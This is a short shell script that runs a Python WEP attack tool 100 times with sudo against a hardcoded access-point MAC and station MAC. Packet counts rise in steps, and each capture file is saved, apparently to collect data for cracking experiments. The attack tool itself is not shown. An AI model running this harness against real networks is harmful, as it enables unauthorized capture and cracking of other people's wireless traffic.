#!/bin/sh

for i in {1..20}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 15000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {21..40}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 20000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {41..60}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 25000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {61..80}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 35000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done

for i in {81..100}
do
    sudo python3 automated_mp_wep_attacker.py -i wlp7s0 -a c4:12:f5:7c:7c:0c -s d0:df:9a:8e:42:e9 -c 1 -r 40000
    mv "output-01.cap" "automated_cap_files/$i.cap"
done